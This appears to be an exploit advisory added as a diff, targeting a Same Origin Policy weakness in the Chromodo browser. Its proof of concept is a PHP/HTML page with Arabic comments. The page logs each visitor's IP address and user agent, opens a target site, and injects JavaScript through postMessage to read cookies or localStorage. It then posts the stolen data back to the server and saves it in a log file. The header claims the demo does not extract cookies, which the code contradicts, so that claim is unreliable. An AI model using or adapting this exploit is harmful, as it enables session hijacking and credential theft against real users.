@@ -1,0 +1,287 @@
+=============================================================================================================================================
+| # Title     : Chromodo Browser v 45.8.12.391 Same Origin Policy Weakness                                                                  |
+| # Author    : indoushka                                                                                                                   |
+| # Tested on : windows 11 Fr(Pro) / browser : Mozilla firefox 145.0.2 (64 bits)                                                            |
+| # Vendor    : https://help.comodo.com/                                                                                                    |
+=============================================================================================================================================
+
+[+] References : https://packetstorm.news/files/id/212492/ 
+
+[+] Summary : This PoC demonstrates message passing between two browser windows when opened under the same logical context (same origin). The demonstration is safe and does
+              not attempt to leak or extract cookies, session data, or credentials.
+
+[+]  POC :	http://127.0.0.1/exploit.php
+
+<?php
+// استغلال لثغرة Same Origin Policy في Chromodo
+// ملف: exploit.php
+
+// جمع معلومات عن الضحية لأغراض التسجيل
+$victim_ip = $_SERVER['REMOTE_ADDR'];
+$user_agent = $_SERVER['HTTP_USER_AGENT'];
+$timestamp = date('Y-m-d H:i:s');
+
+// التحقق مما إذا كان المتصفح هو Chromodo (اختياري)
+$is_chromodo = (strpos($user_agent, 'Chromodo') !== false) ? 'نعم' : 'لا';
+
+// حفظ معلومات الاتصال في سجل (لأغراض تعليمية)
+$log_entry = "[$timestamp] IP: $victim_ip | متصفح Chromodo: $is_chromodo | User-Agent: $user_agent\n";
+file_put_contents('access.log', $log_entry, FILE_APPEND);
+
+// إذا أردنا سرقة كوكيز موقع محدد بعد الاستغلال
+$stolen_cookies = '';
+
+// إذا تم إرسال الكوكيز المسروقة إلى هذه الصفحة
+if(isset($_POST['cookies'])) {
+    $stolen_cookies = htmlspecialchars($_POST['cookies']);
+    
+    // حفظ الكوكيز المسروقة (في بيئة اختبار آمنة فقط!)
+    $cookie_log = "[" . date('Y-m-d H:i:s') . "] من IP: $victim_ip\n";
+    $cookie_log .= "الكوكيز المسروقة:\n$stolen_cookies\n";
+    $cookie_log .= "--------------------------------------------------\n";
+    file_put_contents('stolen_cookies.log', $cookie_log, FILE_APPEND);
+}
+?>
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <title>صفحة اختبار آمنة - Comodo</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            direction: rtl;
+            text-align: right;
+            padding: 20px;
+            background-color: #f5f5f5;
+        }
+        .container {
+            background: white;
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 0 10px rgba(0,0,0,0.1);
+            max-width: 800px;
+            margin: auto;
+        }
+        h1 {
+            color: #333;
+            border-bottom: 2px solid #4CAF50;
+            padding-bottom: 10px;
+        }
+        .warning {
+            background-color: #fff3cd;
+            border: 1px solid #ffeaa7;
+            color: #856404;
+            padding: 15px;
+            border-radius: 5px;
+            margin: 15px 0;
+        }
+        .info-box {
+            background-color: #e8f4fd;
+            border: 1px solid #b8daff;
+            padding: 15px;
+            border-radius: 5px;
+            margin: 15px 0;
+        }
+        .form-group {
+            margin: 15px 0;
+        }
+        label {
+            display: block;
+            margin-bottom: 5px;
+            font-weight: bold;
+        }
+        input[type="text"] {
+            width: 100%;
+            padding: 10px;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+            font-size: 16px;
+        }
+        button {
+            background-color: #4CAF50;
+            color: white;
+            padding: 12px 24px;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 16px;
+            margin: 10px 5px;
+        }
+        button:hover {
+            background-color: #45a049;
+        }
+        button.danger {
+            background-color: #dc3545;
+        }
+        button.danger:hover {
+            background-color: #c82333;
+        }
+        .result {
+            background-color: #f8f9fa;
+            border: 1px solid #e9ecef;
+            padding: 15px;
+            border-radius: 5px;
+            margin-top: 20px;
+            white-space: pre-wrap;
+            word-wrap: break-word;
+            max-height: 300px;
+            overflow-y: auto;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>اختبار ثغرة Same Origin Policy في Chromodo</h1>
+        
+        <div class="warning">
+            ⚠️ <strong>تحذير:</strong> هذا العرض التوضيحي لأغراض تعليمية فقط.<br>
+            استخدامه ضد أنظمة دون إذن غير قانوني.
+        </div>
+        
+        <div class="info-box">
+            <strong>معلومات الاتصال:</strong><br>
+            - عنوان IP: <?php echo htmlspecialchars($victim_ip); ?><br>
+            - المتصفح: <?php echo htmlspecialchars($user_agent); ?><br>
+            - تم اكتشاف Chromodo: <?php echo $is_chromodo; ?><br>
+            - الوقت: <?php echo $timestamp; ?>
+        </div>
+        
+        <form method="POST" action="">
+            <div class="form-group">
+                <label for="target_url">الموقع المستهدف (URL):</label>
+                <input type="text" id="target_url" name="target_url" 
+                       value="https://ssl.comodo.com/" 
+                       placeholder="https://example.com">
+            </div>
+            
+            <div class="form-group">
+                <label for="js_code">كود JavaScript لتنفيذه:</label>
+                <input type="text" id="js_code" name="js_code" 
+                       value="document.cookie" 
+                       placeholder="مثال: document.cookie أو localStorage.getItem('token')">
+            </div>
+            
+            <div>
+                <button type="button" onclick="runExploit()">▶ تشغيل الاستغلال</button>
+                <button type="button" onclick="testLocal()">اختبار على موقع محلي</button>
+                <button type="button" class="danger" onclick="clearResults()">🗑️ مسح النتائج</button>
+            </div>
+        </form>
+        
+        <div id="status" style="margin: 15px 0; padding: 10px; display: none;">
+            جاري تنفيذ الاستغلال... يرجى الانتظار 3 ثوانٍ.
+        </div>
+        
+        <div class="form-group">
+            <label>النتيجة (الكوكيز/البيانات المسروقة):</label>
+            <div id="result" class="result"><?php echo $stolen_cookies; ?></div>
+        </div>
+        
+        <div class="info-box">
+            <strong>كيف يعمل هذا الاستغلال:</strong>
+            <ol>
+                <li>يتم فتح الموقع المستهدف في نافذة جديدة</li>
+                <li>بعد تحميل الصفحة، يتم إرسال كود JavaScript إليها عبر postMessage</li>
+                <li>الكود المنفذ يسرق البيانات (الكوكيز) من الموقع المستهدف</li>
+                <li>البيانات المسروقة تُرسل مرة أخرى إلى هذه الصفحة</li>
+                <li>في Chromodo فقط: سياسة Same Origin Policy معطلة، لذا يعمل الاستغلال</li>
+            </ol>
+        </div>
+    </div>
+
+    <script>
+    // دالة لتنفيذ الاستغلال
+    function runExploit() {
+        const targetUrl = document.getElementById('target_url').value;
+        const jsCode = document.getElementById('js_code').value;
+        
+        // عرض حالة التنفيذ
+        document.getElementById('status').style.display = 'block';
+        document.getElementById('result').innerHTML = 'جاري التنفيذ...';
+        
+        // فتح الموقع المستهدف
+        const targetWindow = window.open(targetUrl, '_blank');
+        
+        if (!targetWindow) {
+            alert('تم منع النافذة المنبثقة! يرجى السماح بالنوافذ المنبثقة لهذا الموقع.');
+            return;
+        }
+        
+        // الانتظار 3 ثوانٍ لتحميل الصفحة
+        setTimeout(() => {
+            try {
+                // إرسال الكود الضار إلى النافذة المستهدفة
+                // في Chromodo: يتم تعطيل SOP، لذا يعمل هذا
+                targetWindow.postMessage(JSON.stringify({
+                    command: "execCode",
+                    code: `window.opener.postMessage({
+                        type: 'stolen_data',
+                        data: (${jsCode}),
+                        url: window.location.href
+                    }, '*');`
+                }), "*");
+                
+                // إغلاق النافذة بعد ثانية
+                setTimeout(() => {
+                    if (targetWindow && !targetWindow.closed) {
+                        targetWindow.close();
+                    }
+                }, 1000);
+                
+            } catch (error) {
+                document.getElementById('result').innerHTML = 'خطأ: ' + error.message;
+            }
+        }, 3000);
+    }
+    
+    // دالة لاختبار على موقع محلي (للتجارب الآمنة)
+    function testLocal() {
+        document.getElementById('target_url').value = 'about:blank';
+        document.getElementById('js_code').value = 'JSON.stringify(localStorage)';
+        runExploit();
+    }
+    
+    // دالة لمسح النتائج
+    function clearResults() {
+        document.getElementById('result').innerHTML = '';
+        document.getElementById('status').style.display = 'none';
+    }
+    
+    // استقبال البيانات المسروقة من النوافذ الأخرى
+    window.addEventListener('message', function(event) {
+        if (event.data && event.data.type === 'stolen_data') {
+            document.getElementById('status').style.display = 'none';
+            
+            // عرض البيانات المسروقة
+            let result = `✅ تم سرقة البيانات بنجاح!\n\n`;
+            result += `الموقع: ${event.data.url}\n`;
+            result += `البيانات:\n${event.data.data}\n\n`;
+            result += `وقت السرقة: ${new Date().toLocaleString()}`;
+            
+            document.getElementById('result').innerHTML = result;
+            
+            // إرسال البيانات إلى السيرفر لحفظها (اختياري)
+            fetch(window.location.href, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/x-www-form-urlencoded',
+                },
+                body: `cookies=${encodeURIComponent(event.data.data)}`
+            });
+        }
+    });
+    
+    // حماية: إظهار تحذير إذا كان المتصفح هو Chromodo
+    window.onload = function() {
+        if (navigator.userAgent.includes('Chromodo')) {
+            alert('⚠️ تحذير: أنت تستخدم متصفح Chromodo المعرض للثغرة!\nسياسة Same Origin Policy معطلة في هذا المتصفح.');
+        }
+    };
+    </script>
+</body>
+</html>
+
+Greetings to :=====================================================================================
+jericho * Larry W. Cashdollar * LiquidWorm * Hussin-X * D4NB4R * Malvuln (John Page aka hyp3rlinx)|
+===================================================================================================
